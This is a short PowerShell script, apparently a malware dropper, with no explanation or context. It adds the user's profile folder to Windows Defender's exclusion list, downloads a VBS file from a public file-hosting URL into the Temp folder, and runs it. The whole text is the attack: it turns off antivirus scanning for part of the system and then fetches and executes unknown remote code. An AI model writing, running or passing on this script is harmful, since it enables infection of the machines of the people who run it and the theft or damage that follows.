Add-MpPreference -ExclusionPath $env:USERPROFILE

$url = "https://files.catbox.moe/cun1b6.vbs"
$output = "$env:Temp/cun1b6.vbs"
Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output
